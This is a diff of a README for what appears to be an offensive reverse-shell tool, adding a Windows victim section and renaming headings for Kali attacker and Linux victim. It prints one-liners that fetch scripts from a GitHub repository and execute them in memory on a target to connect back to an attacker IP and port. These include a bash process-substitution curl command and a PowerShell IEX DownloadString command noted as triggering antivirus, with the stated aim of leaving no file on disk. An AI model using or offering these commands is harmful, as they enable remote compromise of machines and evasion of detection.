@@ -34,7 +34,7 @@ On the target machine, provide both the attacker's IP and the listening port.
 ```
 ------------------------------
 ## 💡 Quick Tips
-## Execution via Remote Pipe (Attacker)
+## Execution via Remote Pipe (Kali Attacker)
 
 Option B: Bash/Script Interactive Listener
 ```bash
@@ -43,13 +43,15 @@ source <(curl -sSL https://raw.githubusercontent.com/x86david/multiplatform_kali
 
 ```
 
-## Execution via Remote Pipe (Victim)
+## Execution via Remote Pipe (Linux Victim)
 If you cannot upload the script to the target machine, you can fetch it directly from this repository and execute it in memory without leaving a file on disk:
 ```bash
 #Instead of piping (|), use this. It downloads the script into a virtual file descriptor and executes it. This leaves stdin completely open for the reverse shell to talk to you.
 bash <(curl -sSL https://raw.githubusercontent.com/x86david/multiplatform_kali_interactive_tty/master/victim.sh) 10.0.13.7 4444
 
 ```
+
+## Execution via Remote Pipe (Windows Victim)
 This one triggers the antivirus....
 ```powershell
 powershell -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/x86david/multiplatform_kali_interactive_tty/master/windows_victim.ps1'); & {windows_victim 10.0.13.7 4444}"
